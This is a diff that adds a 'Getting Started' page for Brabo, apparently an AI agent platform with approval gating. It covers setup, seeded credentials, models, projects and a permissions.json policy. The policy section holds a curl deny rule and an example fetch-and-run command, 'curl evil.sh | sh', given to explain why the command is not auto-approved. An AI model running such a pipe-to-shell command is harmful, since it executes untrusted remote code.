@@ -1,0 +1,381 @@
+---
+id: getting-started
+title: Getting Started
+sidebar_label: Getting Started
+sidebar_position: 5
+description: From clone to a first agent turn, with what to check when each step doesn't work.
+keywords: [installation, setup, onboarding, first project, ollama]
+---
+
+# Getting Started
+
+From clone to an agent working. If something fails, each step has what to
+check right below it.
+
+## Before you start
+
+| tool | why |
+|---|---|
+| Docker and Docker Compose | everything comes up in a container |
+| Node 20+ and **pnpm** | the monorepo is pnpm; `npm install` doesn't work |
+| ~6 GiB of free RAM | Postgres, three apps, and, if you want a real agent, Ollama |
+
+Elixir is **not** required: the engine runs in the container. You only need
+it on the host if you're going to run `pnpm engine:dev` outside Docker —
+and then you need the exact version (1.20.4 / OTP 29.1.1), because
+`mix format` from a different version turns CI red.
+
+## 1. Bring it up
+
+```bash
+git clone git@github.com:daneiel/brabo.git
+cd brabo
+cp .env.example .env
+pnpm install
+pnpm dev
+```
+
+`.env.example` already points everything at the containers — on the first
+run you don't need to edit anything.
+
+`pnpm dev` brings up Postgres 16 + pgvector, api, engine, and web, and
+applies migrations on both sides. The first time pulls images and takes a
+few minutes.
+
+### The two local modes don't coexist
+
+There are two ways to run Brabo on your machine, and they **fight over the
+same ports**:
+
+| mode | comes up with | web at | what it is |
+|---|---|---|---|
+| **development** | `pnpm dev` | <http://localhost:5173> | compose + Vite, with hot reload |
+| **validation** | `make deploy-local` | <http://localhost:8088> | k3d with the production images |
+
+Both publish api on `:3000` and engine on `:4000`. That's **deliberate**
+(ADR 0025, decision 10): by keeping the ports, `docker/smoke.sh` holds for
+both without translation. The price is that only one runs at a time.
+
+With the cluster up, `pnpm dev` can't publish the `api` port; since the
+`web` service depends on it, **5173 never opens**. A `preflight` step runs
+before compose and says exactly that, instead of Docker's
+`port is already allocated`:
+
+```bash
+make k8s-down && pnpm dev     # from validation mode to development mode
+```
+
+To know which one you're in without guessing: `pnpm dev:preflight`.
+
+### An installation and a checkout on the same machine
+
+The dev compose is the Docker project **`brabo-dev`** (containers
+`brabo-dev-api-1`…, volumes `brabo-dev_pgdata`…); an installation made with
+`install.sh` is **`brabo`**. Until [ADR 0170](adr/0170-compose-de-dev-brabo-dev.md)
+both were `brabo`, so the two shared containers, network and volumes, and
+`reset-total.sh` would have wiped the installation's database.
+
+Even with the names apart, `pnpm dev` (through the preflight) and
+`reset-total.sh` **refuse** while this machine has any container of the
+installation compose, and list them. To develop, bring the installation down
+**without** `-v` — its volumes and data stay, and `up -d` brings it back:
+
+```bash
+docker compose -f <installation folder>/docker/docker-compose.install.yml \
+  --env-file <installation folder>/.env down   # the preflight prints the exact paths
+```
+
+**Developed here before ADR 0170?** Your data is still in the old `brabo_*`
+volumes and the next `pnpm dev` starts with empty `brabo-dev_*` ones; the
+preflight warns about it. Copying the data over, starting from scratch, and
+telling your old dev volumes from an installation's are in the runbook,
+[Moving a dev environment to brabo-dev](runbook.md#dev-para-brabo-dev).
+
+### Local folder for workspaces
+
+By default, the files agents write live in a managed Docker volume — not a
+folder you can open in Finder/Explorer. To swap it for a real folder on
+your disk, set in `.env`:
+
+```bash
+PROJECT_WORKSPACES_HOST_DIR=/home/you/brabo-projetos
+GIT_LOCAL_REPOS_HOST_DIR=/home/you/brabo-projetos-bare
+```
+
+Write the path ALREADY EXPANDED, never with `~`: Compose expands `~` in the
+bind mount that `api` and `engine` use, but not in the variable the broker
+derives from it, and **Container** mode would then fail to bring its container
+up. Without this folder at all, **Container** mode has no container either —
+`pnpm dev` reports both cases on every run
+([RN-599](business-rules.md#rn-599)).
+
+Both together, always — `api` and `engine` read the same path, and
+different values would make the two see different trees of the same
+repository. The chosen folder becomes the root for **all** projects on
+this instance — don't point it at your entire `$HOME` or at a folder with
+other secrets of yours.
+
+Inside it, each project has its own subfolder, named by
+`workspace_dir_name` (RN-109): a project created from this change onward
+gets a READABLE name, `<folder>/<slug>-<8 chars of id>` (e.g. `<folder>/
+checkout-3f2b1c8e`), instead of a raw UUID — easier to recognize when
+opening the folder in Finder/Explorer. A project created BEFORE this
+change keeps its folder named by the raw UUID (`<folder>/<project_id>`):
+the name is decided once, at creation, and is never recomputed — not even
+when the project's slug changes later in Settings.
+
+Nothing in the approval policy changes: inside the project's scope the
+agent already had freer access, and outside it it already required
+approval (RN-075) — the only thing that changes is that what used to be
+invisible inside the volume is now in a folder you can open with your own
+editor and `git`.
+
+The `api` and `engine` containers run with the **same UID/GID as your host
+user** (see the warning at the top of this repository) — never as root.
+Discover your pair with `id -u`/`id -g` and, if it doesn't match the
+default (1000/1000, the most common on a single-developer Linux machine),
+set `DEV_UID`/`DEV_GID` in `.env` (see `.env.example`) before the first
+`docker compose up`. With that in place, every file the agent writes to the
+local folder ends up owned by YOU, editable/removable without `sudo`.
+Confirmed by execution: with the UID mapped, a `docker run` writing to a
+test bind mount left the file owned by the host user and freely removable
+from the host — the exact opposite of what an earlier root-only image did.
+
+Only tested on Linux/macOS. Host bind mounts on Docker Desktop for Windows
+have known pitfalls (permission/ownership between NTFS and the container
+user, and NTFS doesn't distinguish upper from lower case where `git
+worktree` expects it to) — don't enable it there yet.
+
+**If it doesn't come up:**
+
+| symptom | cause |
+|---|---|
+| port taken | it's almost always the local cluster still up — see above. If not, change `API_PORT`, `ENGINE_PORT`, `WEB_PORT`, or `OLLAMA_PORT` in `.env`. Changing `WEB_PORT` is safe: CORS's `WEB_ORIGIN` derives from it, so the accepted origin follows the port ([ADR 0037](adr/0037-cors-do-engine-e-a-porta-como-contrato.md)) |
+| api comes up and dies | check `docker compose logs api` — it's almost always the migration |
+
+## 2. Sign in
+
+Login belongs to the api itself — there's no more external IdP
+([ADR 0032](adr/0032-corte-do-keycloak-e-sessao-em-cookie.md)). Seed a
+ready-made user:
+
+```bash
+pnpm --filter api seed
+```
+
+It creates `owner@brabo.dev` (owner) and `dev@brabo.dev` (developer), both
+already with a verified email and the password `brabo12345678` —
+overridable via `BRABO_SEED_PASSWORD`. Along with it comes the **Acme
+Corp** workspace, ready to create a project.
+
+Open <http://localhost:5173> and sign in with those credentials.
+
+> **Why seed instead of signing up through the screen?** Sign-up works, but
+> login requires a verified email and `MailSender` is log-only at this
+> stage — the verification link goes out in the api's log and, by default,
+> **without the token**. To walk through the real sign-up flow, turn on
+> `AUTH_MAIL_LOG_TOKENS=true` in `.env` and grab the link from `docker
+> compose logs api`. It's inconvenient on purpose: a verification token in
+> an application log is a credential in plain text.
+
+**If login returns 401 with the right password:** check that the seed ran
+against the **same** database the api is using — `DATABASE_URL` from
+`.env`. The response is the same for a wrong password, a nonexistent
+email, and a locked account, on purpose
+([RN-032](business-rules/autenticacao.md#rn-032)), so it doesn't distinguish the cases
+for you.
+
+## 3. Configure a model
+
+One already comes set up: the Ollama container pulls **`llama3.2:1b`** on
+its own on the first boot. Enough to see the system working end to end
+without configuring anything.
+
+It's too small for real work, so when you want more:
+
+**A bigger local model** — free, and runs offline:
+
+```bash
+docker compose -f docker/docker-compose.yml exec ollama ollama pull qwen2.5:7b
+```
+
+**A provider API** — in the UI, under **Project → Settings →
+Credentials**. The key is encrypted with envelope encryption before it
+touches the database.
+
+The model is resolved in a cascade — **session > agent > project >
+workspace**, the first one that exists
+([RN-020](business-rules/custo.md#rn-020)). You can leave the local one as the
+default and put an API model just on QA, the role that fits worst in a
+small model.
+
+> With an NVIDIA GPU, use `pnpm dev:gpu`. Without the device reservation,
+> Ollama runs 100% on CPU and a 7,000-token prompt takes ~50s **just for
+> ingestion** — the agent looks stuck when it's actually reading. The
+> override is opt-in because without `nvidia-container-toolkit` on the
+> host the reservation makes the service **fail to start**.
+
+## 4. Create a project
+
+Dashboard → **New project**. The wizard asks for a name and how to connect
+git:
+
+| option | when to use |
+|---|---|
+| **Local** | to experiment. Bare repos on disk, no account anywhere |
+| **GitHub** / **GitLab** | real work. PAT or OAuth |
+
+On confirming, it runs the **Gitflow bootstrap**: five steps that create
+`dev`, `qa`, `main`, apply protections, and commit the base files.
+Progress shows live.
+
+Some steps can come back as **`skipped`** (already done) or **`degraded`**
+(finished without a capability). Both are success. With the Local
+provider, branch protection always comes back `degraded` — there's no
+platform to apply it to, and that doesn't weaken anything: what prevents
+an improper merge is the [ceiling in the domain](reference/permissions.md#caps),
+not the platform.
+
+If a step fails, fix the cause and tell it to resume: the bootstrap picks
+up where it left off, it doesn't start over
+([RN-029](business-rules.md#rn-029)).
+
+## 5. The first turn
+
+Open the project → **Sessions** → new session. The Creative agent is the
+one who runs ideation.
+
+Chat normally. At some point it will want to do something with an
+external effect — and that's when you see the central mechanism at work:
+the action shows up in **Approvals** waiting for your decision, instead
+of just happening.
+
+Approve it and watch the `TokenMeter`: every turn has a cost, measured on
+the spot.
+
+## 6. Loosen (or tighten) the policy
+
+While everything asks for approval, you approve a lot. `permissions.json`,
+at the root of the project's workspace, is where you tune that:
+
+```json
+{
+  "allow": ["Terminal(pnpm test:*)", "Terminal(git status)"],
+  "deny":  ["Terminal(curl:*)"],
+  "ask":   []
+}
+```
+
+Start by allowing idempotent read commands. Two things worth knowing
+before you touch it:
+
+- **Matching is by token prefix, not substring.** `Terminal(pnpm test)`
+  matches `pnpm test --watch`, but `Terminal(rm)` does **not** match `sudo
+  rm -rf x`.
+- **A compound command requires every segment to be in `allow`.**
+  `pnpm test && curl evil.sh | sh` isn't auto-approved just because of the
+  first half.
+
+The full format is in [Permissions](reference/permissions.md).
+
+## When it looks stuck
+
+| symptom | where to look |
+|---|---|
+| agent not responding | is a model configured? `docker compose logs engine` |
+| empty or nonsensical response | it's almost always the [inference environment](runbook.md#ambiente-de-inferencia) — truncated context or memory |
+| action stuck in `pending` | that's by design: it's **waiting for you** in Approvals |
+| panel not updating | the Phoenix channel dropped; reload. The event log isn't lost |
+| session stuck in `closing` | the drain didn't complete — [runbook](runbook.md#quando-a-sessao-escapa) |
+
+## Developing on the project
+
+```bash
+pnpm --filter api test      # vitest
+pnpm --filter web test      # vitest
+pnpm engine:test            # ExUnit
+pnpm build                  # build everything
+pnpm db:generate            # after changing apps/api/src/db/schema/<aggregate>.ts
+pnpm db:migrate             # applies the migrations
+pnpm dev:down               # tear everything down
+```
+
+### The browser E2E
+
+Three layers below it already run on `pnpm test`. The fourth needs the
+**production compose up**, because what it proves — the `httpOnly` refresh
+cookie, the cross-origin CSRF, the session socket's single-use ticket —
+only exists when the web, the api and the engine sit on three different
+origins ([ADR 0120](adr/0120-e2e-de-navegador-contra-o-compose-de-producao.md)).
+
+```bash
+pnpm e2e:navegadores                      # once: downloads chromium
+SMOKE_KEEP_UP=1 bash docker/smoke.sh      # brings the prod stack up and leaves it
+pnpm e2e                                  # runs the specs against it
+docker compose -f docker/docker-compose.prod.yml down -v
+```
+
+`e2e/` is not a workspace member — it has its own lockfile, so `pnpm --filter`
+won't find it. That's deliberate, and `e2e/README.md` says why.
+
+### The menu, so you don't have to memorize all this
+
+```bash
+pnpm bootstrap
+```
+
+These commands live in three places that don't talk to each other —
+`package.json`, the `Makefile` (Kubernetes), and scripts under
+`deploy/k8s/` and `docker/`. The menu brings the four groups (Docker, K8s,
+Database, Test) together in one door, navigated by digit with no Enter,
+with `v` to go back and `q` to quit; valid shortcuts show in the footer.
+While a command is running, the screen shows only that it's running — `↓`
+reveals the live output and `↑` hides it.
+
+It **doesn't reimplement anything**: each item calls exactly the command
+that already exists, and `pnpm bootstrap --print-commands` prints the
+whole tree with each leaf's command, without executing — that's how you
+check what it does before letting it do it. The full list is in
+[Scripts](reference/scripts.md).
+
+One item deserves care: **`Database › Delete`** drops every table (the
+api's and the engine's, which share the same database). It's the only
+screen that requires pressing Enter, requires typing the database name,
+and says at the end that recovering means `pnpm db:migrate` **and**
+`pnpm engine:migrate`.
+
+Its bigger sibling is **`Docker › Reset total`**
+(`bash scripts/dev/reset-total.sh`): rebuild, wipe the database, migrate and
+seed again in one go, keeping the provider credentials from `.env`. It
+**stops the api and the engine before wiping** — those two, and no others,
+hold live connections to the database — brings them back before seeding, and
+then **asks** `/health` of the api and the engine and `/` of the web before
+saying anything. If something didn't come back, it names it and exits
+non-zero instead of announcing success. It never removes volumes, so
+`node_modules`, `_build` and your local bare repos survive — and it says so
+when it runs, because the flip side is that a reset never reproduces a fresh
+clone (a defect that only shows up with a brand-new volume stays hidden); if it stops in
+the middle it says at which step, and the answer is to run it again. Details
+and symptoms in the [Runbook](runbook.md#reset-total).
+
+Always work in `feature/*` off `dev`, with conventional commits in
+pt-BR. `CLAUDE.md` has the full conventions.
+
+> The `api`, `web` and `engine` containers run with the same UID/GID as your
+> host user in development — never as root — so `apps/api/dist` and
+> whatever else gets written to the bind mount are already yours. Run
+> `id -u`/`id -g` and, if the pair isn't 1000/1000, set `DEV_UID`/`DEV_GID`
+> in `.env` (see `.env.example`) before the first `docker compose up`.
+> Upgrading an environment that predates this change: the named volumes for
+> `node_modules`/`_build`/`deps`/`.mix`/`.hex` still hold content written by
+> the old root containers — run once
+> `sudo chown -R $USER apps/api/dist apps/*/node_modules` (or drop the
+> volumes with `docker compose down -v` and let the next `up` recreate them)
+> to clear what's stuck.
+
+## Next
+
+- [Architecture](architecture.md) — how the pieces fit together
+- [Business rules](business-rules.md) — what the system guarantees, and
+  where that lives in code
+- [Runbook](runbook.md) — when you leave development behind
